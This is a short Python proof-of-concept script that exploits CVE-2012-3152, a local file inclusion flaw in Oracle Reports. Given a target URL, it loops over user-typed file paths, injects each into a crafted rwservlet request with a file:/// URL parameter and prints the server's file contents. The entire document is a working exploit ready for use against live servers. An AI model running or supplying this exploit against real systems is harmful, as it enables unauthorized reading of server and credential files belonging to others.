# PoC script to automate the Oracle Reports LFI (CVE-2012-3152)

#!/usr/bin/env python
import sys
import urllib2                                                       
 
if len(sys.argv) != 2:    # Check for proper args "<script> <URL>"
    print "Usage: "+sys.argv[0]+" <URL>"
    sys.exit(0)
 
URL=sys.argv[1]                                                     
print "[+] Attempting CVE-2012-3152 - Oracle Reports LFI"

while True:        # Endless loop printing out a "~$ " and getting user input via "raw_input" to the command variable
    resource=raw_input("~$ ")
    req = '/reports/rwservlet?report=test.rdf+desformat=html+destype=cache+JOBTYPE=rwurl+URLPARAMETER="file:///'+resource+'"'
    try:
        response=urllib2.urlopen(URL+req)
        for line in response.readlines():
            print line.strip()
    except Exception as e: 
        print e

